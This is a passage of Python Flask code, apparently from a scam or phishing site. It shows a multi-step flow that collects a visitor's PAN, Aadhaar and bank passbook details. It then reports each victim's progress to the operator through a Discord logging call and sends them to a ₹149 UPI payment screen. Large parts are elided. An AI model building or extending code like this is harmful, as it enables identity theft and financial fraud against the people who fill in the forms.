...
@main.route('/step2/<user_id>', methods=['GET', 'POST'])
def step2(user_id):
    if request.method == 'POST':
        pan = request.form.get('pan')
        aadhaar = request.form.get('aadhaar')
        passbook = request.form.get('passbook')
...
@main.route('/status/<user_id>')
def status_page(user_id):
    log_to_discord(f"[STEP 3] User {user_id} reached payment screen (₹149 UPI)")
    return render_template('status.html', user_id=user_id)


@main.route('/api/check_status/<user_id>')
